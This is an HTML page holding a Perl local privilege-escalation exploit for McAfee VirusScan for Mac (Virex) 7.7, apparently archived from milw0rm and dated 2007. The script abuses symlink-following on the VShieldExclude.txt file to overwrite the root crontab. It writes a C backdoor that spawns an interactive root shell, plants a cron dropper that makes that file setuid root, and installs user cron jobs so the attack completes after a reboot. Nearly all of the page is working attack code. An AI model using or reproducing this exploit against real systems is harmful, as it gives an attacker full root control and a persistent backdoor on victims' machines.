<html><head><title>McAfee VirusScan for Mac (Virex) <= 7.7 Local Root Exploit</title></head><pre>#!/usr/bin/perl
#
# http://www.digitalmunition.com
# written by kf (kf_lists[at]digitalmunition[dot]com)
#
# Following symlinks is bad mmmmmmmmmmkay!
#

$dest = &quot;/var/cron/tabs/root&quot;;

$tgts{&quot;0&quot;} = &quot;Virex 7.7.dmg:\&quot;/Library/Application
Support/Virex/VShieldExclude.txt\&quot;  &quot;;

unless (($target) = @ARGV) {
       print &quot;\n\nUsage: $0 &lt;target&gt; \n\nTargets:\n\n&quot;;

       foreach $key (sort(keys %tgts)) {
               ($a,$b) = split(/\:/,$tgts{&quot;$key&quot;});
               print &quot;\t$key . $a\n&quot;;
       }

       print &quot;\n&quot;;
       exit 1;
}

($a,$b) = split(/\:/,$tgts{&quot;$target&quot;});
print &quot;*** Target: $a $b\n&quot;;

# Set aside a backdoor that we will chmod and chown later
open(BD,&quot;&gt;/tmp/pwnrex.c&quot;);
printf BD &quot;main()\n&quot;;
printf BD &quot;{ seteuid(0); setegid(0); setuid(0); setgid(0);
system(\&quot;/bin/sh -i\&quot;); }\n&quot;;
#system(&quot;gcc -o /Users/Shared/shX /tmp/pwnrex.c&quot;);
system(&quot;cp /usr/bin/id  /Users/Shared/shX&quot;);  # this is for those without gcc.

# set aside root crontab dropper
open(PH,&quot;&gt;/Users/Shared/droptab.pl&quot;);
print PH &quot;system\(\&quot;echo \'* * * * * /usr/sbin/chown root: /Users/Shared/shX; /bin/chmod 4755 /Users/Shared/shX\' &gt; /var/cron/tabs/root\&quot;\)\;\n&quot;;

# rm the existing log file and symlink it to the root crontab file. A
reboot will be required to exploit this.
system(&quot;rm -rf $b; ln -s $dest $b&quot;);

# start up a crontab request that will be *VERY* useful after the machine has rebooted.
system(&quot;echo '* * * * * /usr/bin/perl /Users/Shared/droptab.pl; sleep 90; crontab /Users/Shared/xxx' &gt; /tmp/user_cron&quot;);
system(&quot;echo '* * * * * /usr/bin/id' &gt;  /Users/Shared/xxx&quot;);
system(&quot;crontab /tmp/user_cron&quot;);

print &quot;wait for a reboot and a cron run...\n&quot;

# milw0rm.com [2007-02-28]</pre></html>